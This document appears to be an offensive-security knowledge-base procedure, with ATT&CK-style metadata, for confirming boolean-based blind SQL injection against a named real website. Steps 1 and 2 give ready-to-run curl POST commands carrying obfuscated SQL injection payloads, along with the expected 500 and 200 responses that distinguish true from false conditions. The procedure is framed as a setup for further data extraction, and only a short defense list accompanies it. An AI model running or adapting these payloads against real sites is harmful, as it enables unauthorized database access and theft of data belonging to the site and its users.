---
id: proc-confirm-sqli-response-zomato
tags:
  - sqli
  - blind-sqli
  - confirmation
type: procedure
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-boolean-sqli-test]]'
verified: false
platforms:
  - Web
  - PHP
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.291Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm SQL Injection via Response Differences

## Summary

This procedure validates the SQL injection by sending payloads with true/false conditions and observing HTTP status code differences to confirm boolean-based blind SQLi behavior.

## Description

By comparing responses—500 for true (error-inducing) and 200 for false (normal execution)—attackers can infer database state. This exploits the lack of error handling in the backend, allowing gradual information disclosure like MySQL version.

## Requirements

1. Successful payload from prior crafting
2. Multiple test runs with varied conditions
3. Response analyzer (e.g., curl verbose or proxy)
4. Valid session

## Defense

Defensive measures and detection strategies:

- Normalize error responses to avoid information leakage via status codes
- Rate-limit requests to the endpoint
- Implement anomaly detection for repeated similar payloads

## Objectives

1. Differentiate true/false conditions
2. Confirm injection point and impact
3. Enable further blind extraction chains

## Instructions

### Step 1: Test True Condition

**Context**: Send payload for known true (e.g., LIKE '5' for version).

**Command** ([[commands/curl-boolean-sqli-test]]):
```bash
curl -v -X POST "https://www.zomato.com/█████.php?res_id={RES_ID}" \
  --data "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23\"]"
```

> Expected output: HTTP/1.1 500 Internal Server Error.

### Step 2: Test False Condition

**Context**: Alter to false (e.g., LIKE '4') to baseline normal response.

**Command** ([[commands/curl-boolean-sqli-test]]):
```bash
curl -v -X POST "https://www.zomato.com/█████.php?res_id={RES_ID}" \
  --data "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/4/**/%23\"]"
```

> Expected output: HTTP/1.1 200 OK, confirming differential behavior.

### Step 3: Analyze Differences

**Context**: Compare logs to validate.

No command; manually note status codes and response times.

> Success: Consistent 500 vs. 200 patterns indicate exploitable blind SQLi.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-boolean-sqli-test]]

## Tools Used


## Tags

- [[sqli]]
- [[confirmation]]
